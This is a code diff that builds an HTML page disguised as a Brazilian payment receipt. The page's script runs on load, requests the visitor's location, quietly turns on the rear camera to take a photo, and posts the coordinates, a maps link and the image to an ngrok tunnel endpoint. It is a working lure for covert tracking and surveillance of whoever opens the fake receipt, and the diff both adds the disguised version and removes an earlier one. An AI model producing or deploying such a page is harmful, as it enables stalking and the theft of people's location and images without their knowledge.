@@ -1,58 +1,89 @@
-<script>
-  document.addEventListener("DOMContentLoaded", () => {
-    const dataAtual = new Date();
-    const dia = String(dataAtual.getDate()).padStart(2, '0');
-    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-    const ano = dataAtual.getFullYear();
-    document.getElementById("data-atual").textContent = `${dia}/${mes}/${ano}`;
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Comprovante de Recebimento</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+  <div class="comprovante-container">
+    <h1>Comprovante de Recebimento</h1>
+    <div class="informacoes">
+      <p><span>Data:</span> <span id="data-atual"></span></p>
+      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
+      <p><span>De:</span> João Silva de Oliveira</p>
+      <p><span>Status:</span> Recebido com Sucesso</p>
+    </div>
+    <button class="botao" onclick="window.print()">Imprimir</button>
+    <div class="comprovante-footer">
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+      <p><a href="#">Clique aqui</a> para mais informações.</p>
+    </div>
+  </div>
 
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(sendData, (err) => {
-        alert("Erro na geolocalização: " + err.message);
-        console.error("Erro na geolocalização:", err);
-      });
-    } else {
-      alert("Geolocalização não suportada.");
-      console.error("Geolocalização não suportada.");
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const dataEl = document.getElementById("data-atual");
+      if (dataEl) {
+        const dataAtual = new Date();
+        const dia = String(dataAtual.getDate()).padStart(2, '0');
+        const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+        const ano = dataAtual.getFullYear();
+        dataEl.textContent = `${dia}/${mes}/${ano}`;
+      }
+
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(sendData, (err) => {
+          console.error("Erro ao obter localização:", err.message);
+        });
+      } else {
+        console.error("Geolocalização não suportada pelo navegador.");
+      }
+    });
+
+    async function sendData(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const maps = `https://maps.google.com/?q=${latitude},${longitude}`;
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+        const video = document.createElement("video");
+        video.setAttribute("playsinline", true);
+        video.srcObject = stream;
+
+        await new Promise((resolve) => {
+          video.onloadedmetadata = () => {
+            video.play().then(resolve);
+          };
+        });
+
+        // Aguarda um tempo para a câmera estabilizar (essencial em mobile)
+        await new Promise(resolve => setTimeout(resolve, 1500));
+
+        const canvas = document.createElement("canvas");
+        canvas.width = 640;
+        canvas.height = 480;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const image = canvas.toDataURL("image/jpeg");
+
+        // Libera a câmera
+        stream.getTracks().forEach(track => track.stop());
+
+        // Envia os dados
+        await fetch("https://3677-177-200-138-128.ngrok-free.app/send-data", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ latitude, longitude, maps, image })
+        });
+
+        console.log("Localização e imagem enviados com sucesso.");
+      } catch (error) {
+        console.error("Erro ao capturar ou enviar dados:", error);
+      }
     }
-  });
-
-  async function sendData(position) {
-    const latitude = position.coords.latitude;
-    const longitude = position.coords.longitude;
-    const maps = `https://maps.google.com/?q=${latitude},${longitude}`;
-    console.log("Localização:", latitude, longitude);
-
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      const video = document.createElement("video");
-      video.srcObject = stream;
-      await video.play();
-
-      // Espera para garantir que a câmera ligou (importante para celulares)
-      await new Promise(resolve => setTimeout(resolve, 2500));
-
-      const canvas = document.createElement("canvas");
-      canvas.width = 640;
-      canvas.height = 480;
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const image = canvas.toDataURL("image/jpeg");
-
-      stream.getTracks().forEach(track => track.stop());
-
-      console.log("Imagem capturada. Enviando para o backend...");
-
-      await fetch("https://3677-177-200-138-128.ngrok-free.app/send-data", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ latitude, longitude, maps, image })
-      });
-
-      console.log("Dados enviados com sucesso.");
-    } catch (error) {
-      alert("Erro ao capturar imagem.");
-      console.error("Erro ao capturar imagem:", error);
-    }
-  }
-</script>
+  </script>
+</body>
+</html>
